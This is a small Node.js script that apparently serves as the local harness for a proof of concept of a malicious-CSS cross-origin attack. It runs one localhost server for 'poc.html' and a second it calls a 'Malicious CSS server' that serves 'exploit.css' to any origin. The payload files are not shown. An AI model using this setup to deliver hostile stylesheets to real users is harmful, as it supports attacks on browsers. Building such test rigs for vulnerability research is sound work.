// server.js : Need two different ports to simulate cross-origin request 
const http = require('http');
const fs = require('fs');

// Main page server（Port 3000）
http.createServer((req, res) => {
  if(req.url === '/poc.html') {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end(fs.readFileSync('poc.html'));
  }
}).listen(3000, () => {
    console.log('Main page server is running on：http://localhost:3000');
});

// Malicious CSS server（Port 3001）
http.createServer((req, res) => {
  if(req.url === '/exploit.css') {
    res.writeHead(200, {
      'Content-Type': 'text/css',
      'Access-Control-Allow-Origin': '*' // CORS allow cross-origin request 
    });
    res.end(fs.readFileSync('exploit.css'));
  }
}).listen(3001, () => {
    console.log('Malicious CSS server is running on：http://localhost:3001');
});
